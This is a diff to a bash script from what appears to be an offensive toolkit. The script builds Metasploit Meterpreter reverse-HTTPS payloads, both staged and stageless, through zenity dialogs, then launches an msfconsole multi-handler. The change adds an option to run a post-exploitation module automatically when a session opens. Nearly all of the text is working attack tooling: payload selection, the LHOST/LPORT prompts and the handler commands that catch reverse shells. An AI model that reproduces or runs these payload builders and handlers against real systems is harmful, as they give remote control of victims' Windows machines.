@@ -41,7 +41,8 @@ ENCODE=`cat $IPATH/settings | egrep -m 1 "MSF_ENCODER" | cut -d '=' -f2` > /dev/
 ChEk_DB=`cat $IPATH/settings | egrep -m 1 "REBUILD_MSFDB" | cut -d '=' -f2` > /dev/null 2>&1 # Rebuild msfdb database?
 DEFAULT_EXT=`cat $IPATH/settings | egrep -m 1 "PAYLOAD_EXTENSION" | cut -d '=' -f2` > /dev/null 2>&1 # Payload extension(bat|ps1|txt)
 ENCODE_NUMB=`cat $IPATH/settings | egrep -m 1 "ENCODER_INTERACTIONS" | cut -d '=' -f2` > /dev/null 2>&1 # Interactions to encode (0|9)
-PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT" | cut -d '=' -f2` > /dev/null 2>&1 # Msf command to run at session popup
+ExEc=`cat $IPATH/settings | egrep -m 1 "RUN_POST_EXPLOTATION" | cut -d '=' -f2` > /dev/null 2>&1 # Run post-exploitation at session popup?
+PoSt=`cat $IPATH/settings | egrep -m 1 "POST_MODULE" | cut -d '=' -f2` > /dev/null 2>&1 # Msf command to run at session popup?
 
 
 
@@ -261,7 +262,7 @@ fi
 #
 # Chose to build a staged (payload.bat|ps1|txt) or a stageless (payload.exe) ..
 #
-BuIlD=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.$DEFAULT_EXT)" FALSE "stageless (payload.exe)" --width 300 --height 180) > /dev/null 2>&1
+BuIlD=$(zenity --list --title "☠ PAYLOAD CATEGORIES ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.$DEFAULT_EXT)" FALSE "stageless (payload.exe)" --width 300 --height 180) > /dev/null 2>&1
 #
 # Staged payload build (batch output)
 # HINT: Edit settings file and change 'DEFAULT_EXTENSION=bat' to the extension required ..
@@ -291,11 +292,8 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
     echo ${BlueF}[☠]${white} Building staged payload ..${BlueF};
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
-    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1
-
-     #
+    paylo=$(zenity --list --title "☠ PAYLOADS AVAILABLE ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1
      # Config correct payload arch selected ..
-     #
      if [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
        ArCh="x64"
      else
@@ -334,7 +332,12 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   # A staged payload would need to set the HandlerSSLCert and
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
-  xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
+  if [ "$ExEc" = "YES" ]; then
+    # Run post-exploitation module 
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
+  else
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; exploit'"
+  fi
   sleep 2
 
 
@@ -352,7 +355,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
     echo ${BlueF}[☠]${white} Building stageless payload ..${BlueF};
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
-    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" --width 350 --height 220) > /dev/null 2>&1
+    paylo=$(zenity --list --title "☠ PAYLOADS AVAILABLE ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" --width 350 --height 220) > /dev/null 2>&1
 
      #
      # Config correct payload arch selected ..
@@ -372,7 +375,12 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   # A stageless payload would need to set the HandlerSSLCert and
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
-  xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
+  if [ "$ExEc" = "YES" ]; then
+    # Run post-exploitation module 
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
+  else
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; exploit'"
+  fi
   sleep 2
 
 
